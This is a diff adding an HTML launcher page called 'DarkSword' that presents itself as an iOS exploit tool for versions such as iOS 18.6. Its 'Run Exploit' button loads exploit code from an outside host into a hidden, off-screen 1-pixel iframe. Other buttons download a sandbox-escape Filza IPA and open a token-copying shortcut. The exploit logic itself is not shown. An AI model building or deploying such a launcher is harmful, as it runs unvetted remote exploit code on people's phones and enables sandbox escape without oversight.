@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DarkSword</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;700&display=swap');
+
+    body {
+      font-family: 'Noto Sans TC', monospace;
+      background: #0a0a0a;
+      color: #0f0;
+      margin: 0;
+      padding: 20px 16px;
+      min-height: 100vh;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .title {
+      font-size: 32px;
+      font-weight: 700;
+      color: #00ff9d;
+      text-shadow: 0 0 20px #00ff9d;
+      margin: 0;
+    }
+
+    .lang-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+      border: 1px solid #0f0;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .system-info {
+      background: #1a1a1a;
+      text-align: center;
+      padding: 12px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      color: #00ff9d;
+      font-size: 16px;
+    }
+
+    .log-container {
+      background: #111;
+      border: 1px solid #333;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+      min-height: 180px;
+      max-height: 220px;
+      overflow-y: auto;
+    }
+
+    .log-entry {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 10px;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    .log-bar {
+      width: 4px;
+      height: 20px;
+      background: #00ff9d;
+      margin-right: 12px;
+      flex-shrink: 0;
+      animation: logRotate 1.2s linear infinite;
+      animation-play-state: paused;
+    }
+
+    .log-bar.active {
+      animation-play-state: running;
+    }
+
+    @keyframes logRotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .log-time { color: #666; margin-right: 8px; white-space: nowrap; }
+    .log-text { color: #ddd; }
+
+    .main-run-btn {
+      width: 100%;
+      padding: 18px;
+      margin-bottom: 16px;
+      background: linear-gradient(90deg, #ff2d55, #ff6b9d);
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 700;
+      color: white;
+      cursor: pointer;
+      box-shadow: 0 0 25px rgba(255, 45, 85, 0.7);
+    }
+
+    .buttons {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .btn {
+      flex: 1;
+      padding: 16px;
+      border: none;
+      border-radius: 12px;
+      font-size: 17px;
+      font-weight: 600;
+      color: white;
+      cursor: pointer;
+    }
+
+    .btn-green { background: linear-gradient(90deg, #00c853, #64dd17); }
+    .btn-blue { background: linear-gradient(90deg, #00b0ff, #40c4ff); }
+
+    .steps {
+      background: #1a1a1a;
+      padding: 18px;
+      border-radius: 12px;
+      font-size: 15px;
+      line-height: 1.8;
+      color: #ccc;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      color: #555;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1 class="title">DarkSword</h1>
+    <button id="langBtn" class="lang-btn">中 / EN</button>
+  </div>
+
+  <div class="system-info">
+    當前系統：<span id="iosVersion">iOS 18.6</span>
+  </div>
+
+  <div class="log-container" id="logContainer"></div>
+
+  <!-- 啟動漏洞利用按鈕（位置已調整） -->
+  <button id="runBtn" class="main-run-btn">啟動漏洞利用</button>
+
+  <div class="buttons">
+    <button id="getTokenBtn" class="btn btn-green">取得捷徑</button>
+    <button id="downloadBtn" class="btn btn-blue">下載 IPA</button>
+  </div>
+
+  <div class="steps" id="steps">
+    <b>第 1 步：</b> 下載上方的 Filza IPA 並取得複製令牌的捷徑<br>
+    <b>第 2 步：</b> 點擊啟動並等待約 60 秒（結束時網頁可能凍結/當機/重啟，這代表已完成）<br>
+    <b>第 3 步：</b> 打開「捷徑」App，執行「Copy token」捷徑<br>
+    <b>第 4 步：</b> 將取得的令牌貼上至 Filza 中
+  </div>
+
+  <div class="footer">
+    Original Author: @Little_34306 | Source: 34306.lol
+  </div>
+
+  <script>
+    // ==================== 語言切換 ====================
+    let currentLang = 'zh';
+
+    const translations = {
+      zh: {
+        title: "DarkSword",
+        system: "當前系統：",
+        runBtn: "啟動漏洞利用",
+        getToken: "取得捷徑",
+        downloadIPA: "下載 IPA",
+        step1: "第 1 步： 下載上方的 Filza IPA 並取得複製令牌的捷徑",
+        step2: "第 2 步： 點擊啟動並等待約 60 秒（結束時網頁可能凍結/當機/重啟，這代表已完成）",
+        step3: "第 3 步： 打開「捷徑」App，執行「Copy token」捷徑",
+        step4: "第 4 步： 將取得的令牌貼上至 Filza 中",
+        logReady: "終端已就緒",
+        logStart: "發起漏洞利用... 網頁可能會凍結/重新整理"
+      },
+      en: {
+        title: "DarkSword",
+        system: "Current System: ",
+        runBtn: "Run Exploit",
+        getToken: "Get Shortcut",
+        downloadIPA: "Download IPA",
+        step1: "Step 1: Download Filza IPA and get the token copy shortcut",
+        step2: "Step 2: Tap Run and wait ~60 seconds (page may freeze/crash/reload at the end)",
+        step3: "Step 3: Open Shortcuts app and run \"Copy token\" shortcut",
+        step4: "Step 4: Paste the token into Filza",
+        logReady: "Terminal Ready",
+        logStart: "Starting exploit... Page may freeze/reload"
+      }
+    };
+
+    function switchLanguage() {
+      currentLang = currentLang === 'zh' ? 'en' : 'zh';
+      document.getElementById('langBtn').textContent = currentLang === 'zh' ? '中 / EN' : 'EN / 中';
+      
+      const t = translations[currentLang];
+      document.querySelector('.title').textContent = t.title;
+      document.getElementById('runBtn').textContent = t.runBtn;
+      document.getElementById('getTokenBtn').textContent = t.getToken;
+      document.getElementById('downloadBtn').textContent = t.downloadIPA;
+      
+      const stepsHTML = `
+        <b>${t.step1.split('：')[0]}：</b> ${t.step1.split('：')[1]}<br>
+        <b>${t.step2.split('：')[0]}：</b> ${t.step2.split('：')[1]}<br>
+        <b>${t.step3.split('：')[0]}：</b> ${t.step3.split('：')[1]}<br>
+        <b>${t.step4.split('：')[0]}：</b> ${t.step4.split('：')[1]}
+      `;
+      document.getElementById('steps').innerHTML = stepsHTML;
+    }
+
+    // ==================== 日誌（帶轉動動畫） ====================
+    function addLog(text, active = false) {
+      const container = document.getElementById('logContainer');
+      const entry = document.createElement('div');
+      entry.className = 'log-entry';
+      entry.innerHTML = `
+        <div class="log-bar ${active ? 'active' : ''}"></div>
+        <span class="log-time">[${new Date().toLocaleTimeString('zh-TW', {hour12: true})}]</span>
+        <span class="log-text">${text}</span>
+      `;
+      container.appendChild(entry);
+      container.scrollTop = container.scrollHeight;
+    }
+
+    // ==================== 後端路徑 ====================
+    const baseUrl = "http://34306.lol/darksword";
+
+    function runExploit() {
+      const runBtn = document.getElementById('runBtn');
+      runBtn.disabled = true;
+      runBtn.style.opacity = "0.6";
+      runBtn.textContent = currentLang === 'zh' ? "執行中..." : "Running...";
+
+      // 清空並加入日誌
+      document.getElementById('logContainer').innerHTML = '';
+      addLog(translations[currentLang].logReady);
+      addLog(translations[currentLang].logStart, true);
+
+      // 執行 exploit（嵌入後端）
+      const frame = document.createElement('iframe');
+      frame.src = `${baseUrl}/frame.html?${Date.now()}`;
+      frame.style.position = 'absolute';
+      frame.style.width = '1px';
+      frame.style.height = '1px';
+      frame.style.opacity = '0.01';
+      frame.style.left = '-9999px';
+      document.body.appendChild(frame);
+    }
+
+    // ==================== 事件綁定 ====================
+    document.getElementById('runBtn').onclick = runExploit;
+    document.getElementById('getTokenBtn').onclick = () => {
+      window.open('https://www.icloud.com/shortcuts/3e90b09cd789488fa4f87a471284f544', '_blank');
+    };
+    document.getElementById('downloadBtn').onclick = () => {
+      window.open(`${baseUrl}/Filza_SBX_Token.ipa`, '_blank');
+    };
+    document.getElementById('langBtn').onclick = switchLanguage;
+
+    // 接收完成訊號
+    window.addEventListener('message', function(event) {
+      if (event.data && event.data.type === 'darksword_done') {
+        document.getElementById('runBtn').textContent = currentLang === 'zh' ? "已完成" : "Done";
+        document.getElementById('runBtn').style.background = "linear-gradient(90deg, #00c853, #64dd17)";
+      }
+    });
+
+    // 初始化顯示 iOS 版本
+    const ua = navigator.userAgent;
+    const iosMatch = /iPhone OS ([0-9_]+)/g.exec(ua);
+    if (iosMatch) {
+      document.getElementById('iosVersion').textContent = `iOS ${iosMatch[1].replace(/_/g, '.')}`;
+    }
+  </script>
+</body>
+</html>
